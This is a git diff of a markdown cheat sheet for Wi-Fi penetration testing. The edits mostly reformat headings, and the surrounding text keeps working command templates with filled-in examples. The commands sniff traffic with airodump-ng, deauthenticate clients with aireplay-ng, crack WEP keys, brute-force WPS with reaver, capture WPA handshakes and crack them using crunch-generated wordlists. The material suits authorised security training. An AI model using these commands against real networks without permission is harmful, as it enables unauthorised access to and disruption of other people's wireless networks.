@@ -22,7 +22,7 @@ Monitordevice has the same name than interface
 ```
 
 # Network Penetration Testing - Pre Connection Attacks
-## Start general packet sniffing
+### Start general packet sniffing
 
 ```
 > airodump-ng [interface]
@@ -33,7 +33,7 @@ Example:
 ```
 
 
-## Start targeted packet sniffing
+### Start targeted packet sniffing
 
 ```
 > airodump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]
@@ -42,8 +42,8 @@ Example:
 
 > airodump-ng –channel 6 –bssid 11:22:33:44:55:66 –write out mon0
 ```
-# Deauthentication attacks
-## To disconnect a device from the AP to let it reauthenticate 
+### Deauthentication attacks
+#### To disconnect a device from the AP to let it reauthenticate 
 
 To de-authenticate all clients in a specific network
 ```
@@ -65,15 +65,13 @@ Example:
 ```
 
 # Gaining access to encrypted networks 
-------------------------------------------------------------------------------
 
 ## WEP Cracking 
 
 using a random 24-bit Initializing Vector (IV), 
 in a busy network we can collect more than two packets with the same IV.
 
-### CASE 1: BASE CASE 
---------------------------
+### CASE 1: BASE CASE
 
 Log the traffic from the target network
 
@@ -87,7 +85,6 @@ Ex: `> aircrack-ng out.cap`
 
 
 ### CASE 2: AP is idle or no clients associated with AP (packet injection)
-------------------------------------------------------------------------
 
 we have to authenticate our wifi card with the AP, because AP's ignore 
 any requests that come from devices that are not associated with the AP
@@ -114,7 +111,6 @@ Then we try to crack the key
 ## WPA Cracking
 
 ### CASE 1: BASE CASE WITH WPS ENABLED 
-----------------------------------------
 
 encrypted with a unique temporary key, number of data collected is irrelevant.
 
@@ -128,7 +124,6 @@ ex: `> reaver -b E0:69:95:8E:18:22 -c 11 -i mon0`
 
 
 ### CASE 2: WPS DISABLED, CAPTURING HANDSHAKE
---------------------------------------------------
 
 Handshake packets are sent every time a client associates with the target AP.
 Start airodump to see if there are clients connected to the AP
@@ -144,7 +139,7 @@ connect back automatically.
 Ex: `> aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 -c 00:AA:11:22:33:44 mon0`
 (Notice top right corner of airodump-ng will say “WPA handshake”.)
 
-# Creating a wordlist #
+## Creating a wordlist
 we need a list of all the possible passwords, you can create them yourself
 
 `> crunch [min] [max] [characters=lower|upper|numbers|symbols] -t [pattern] -o file`
@@ -155,8 +150,7 @@ Use aircrack to crack the key
 `> aircrack-ng [HANDSHAKE FILE] -w [WORDLIST] [INTERFACE]`
 ex: `> aircrack-ng is-01.cap -w list mon0`
 
-# Scanning for networks 
-## POST CONNECTION ATTACKS
+# POST CONNECTION ATTACKS (TOT HIER OPMAAK)
 
 -------NETDISCOVER----------
 Discover the connected clients of the current network
